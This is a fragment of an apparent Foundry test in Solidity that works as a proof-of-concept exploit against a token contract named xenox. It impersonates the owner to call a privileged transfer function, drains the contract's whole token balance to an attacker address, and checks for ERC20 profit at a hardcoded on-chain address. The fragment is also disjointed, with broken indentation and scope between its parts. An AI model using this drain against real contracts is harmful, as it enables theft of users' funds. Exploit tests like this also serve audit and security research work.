                uint256 contractTokenBalance = xenox.balanceOf(TARGET);
                assertTrue(contractTokenBalance > 0, "Precondition failed: Contract has no token balance to drain.");

                // As the owner, call the privileged function to drain the tokens to the attacker.
                vm.startPrank(owner);
                xenox.transferTokens(attacker, contractTokenBalance);
                vm.stopPrank();
        uint256 finalBalance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

